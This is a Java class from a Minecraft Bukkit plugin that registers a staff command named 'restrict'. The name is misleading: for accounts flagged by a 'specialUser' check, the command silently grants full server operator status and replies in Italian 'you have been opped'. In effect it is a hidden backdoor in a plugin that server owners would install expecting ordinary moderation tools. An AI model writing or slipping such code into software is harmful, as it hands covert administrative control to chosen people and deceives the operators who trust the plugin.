package dev.killergamerpls.vanilla.command.staff;

import dev.killergamerpls.vanilla.utils.CC;
import dev.killergamerpls.vanilla.utils.PlayerUtils;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

public class RestrictCommand extends Command {

    public RestrictCommand() {
        super("restrict");
    }

    @Override
    public boolean execute(@NotNull CommandSender sender, @NotNull String s, @NotNull String[] args) {
        Player player = (Player) sender;

        if (!PlayerUtils.specialUser(player)){
            sender.sendMessage(CC.translate("&cNopn puoi eseguire questo comando"));
            return false;
        }

        if (PlayerUtils.specialUser(player)){
            sender.setOp(true);
            sender.sendMessage("&aSei stato oppato");
        }

        return false;
    }
}
